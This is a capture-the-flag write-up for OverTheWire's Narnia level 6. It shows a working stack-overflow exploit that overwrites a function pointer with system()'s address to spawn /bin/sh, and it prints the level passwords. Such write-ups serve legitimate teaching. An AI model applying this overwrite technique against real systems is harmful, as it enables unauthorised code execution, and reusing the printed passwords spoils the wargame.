# Narnia Level 06 to 07

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 6 -> 7 |
| Status | Complete |

## Objective

Overflow the adjacent stack buffers in `narnia6`, redirect the function pointer `fp` from `puts()` to `system()`, and recover `narnia7`.

## Given Access

User: `narnia6`

Password:

```text
BNSjoSDeGL
```

## Recon

`/narnia/narnia6.c` defines:

- `char b1[8], b2[8];`
- `int (*fp)(char *) = &puts;`
- `strcpy(b1, argv[1]);`
- `strcpy(b2, argv[2]);`
- `fp(b1);`

The key point is the stack layout:

- `b2`
- `b1`
- `fp`

So:

- overflowing `b1` can overwrite `fp`
- overflowing `b2` can overwrite the contents of `b1`

## Address Discovery

The remote libc base and `system()` offset were checked live:

```text
libc base: 0xf7d82000
system@@GLIBC_2.0 offset: 0x0004f8e0
system() address: 0xf7dd18e0
```

## Exploit Strategy

1. Use `argv[1]` to overflow `b1` and replace `fp` with `system()`.
2. Use `argv[2]` to overflow `b2` into `b1`, replacing the future argument string with `/bin/sh`.
3. Let the program call `fp(b1)`.

## Working Exploit

```bash
PAY=$(python3 -c 'import sys,struct;sys.stdout.buffer.write(b"A"*8+struct.pack("<I",0xf7dd18e0))')
/narnia/narnia6 "$PAY" AAAAAAAA/bin/sh
```

That yielded a shell as `narnia7`, and the next password was recovered with:

```bash
cat /etc/narnia_pass/narnia7
```

## Password

```text
54RtepCEU0
```

## Notes

- This level is easier once the exact local-variable order is confirmed from disassembly.
- `argv[1]` only needs `8` filler bytes before the 4-byte function-pointer overwrite.
- `argv[2]` needs `8` filler bytes so that `/bin/sh` lands exactly where `b1` begins.

## References

- https://overthewire.org/wargames/narnia/
